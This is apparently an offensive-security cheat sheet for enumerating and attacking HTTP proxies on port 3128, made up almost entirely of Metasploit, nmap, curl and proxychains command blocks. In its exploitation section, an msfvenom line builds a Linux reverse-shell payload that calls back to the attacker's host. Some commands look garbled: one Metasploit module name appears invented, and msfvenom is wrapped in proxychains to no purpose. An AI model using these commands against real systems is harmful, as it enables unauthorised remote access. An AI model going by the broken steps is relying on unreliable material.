# HTTP Proxy

## Enumeration

### Metasploit

##### proxy_enum
```bash
use auxiliary/scanner/http/proxy_enum
set RHOSTS [IP]
set RPORT 3128
run
```

### Nmap

##### nmap (Proxy version detection)
```bash
nmap -p 3128 --script=http-proxy-auth [IP]
```

##### nmap (Proxy information gathering)
```bash
nmap -p 3128 --script=http-proxy-fingerprint [IP]
```

### curl

##### curl (Test HTTP Proxy)
```bash
curl -x http://[IP]:3128 [URL]
```

### Proxychains

##### proxychains (Use proxy to connect)
```bash
proxychains curl [URL]
```


---
---


## Exploitation

### Metasploit

##### proxy_http_fingerprint
```bash
use auxiliary/scanner/http/proxy_http_fingerprint
set RHOSTS [IP]
set RPORT 3128
run
```

### Proxychains

##### proxychains (Launch Metasploit over Proxy)
```bash
proxychains msfconsole
```

##### proxychains (Perform attack over Proxy)
```bash
proxychains msfvenom -p linux/x86/shell_reverse_tcp LHOST=[YourIP] LPORT=[port] -f elf > payload.elf
```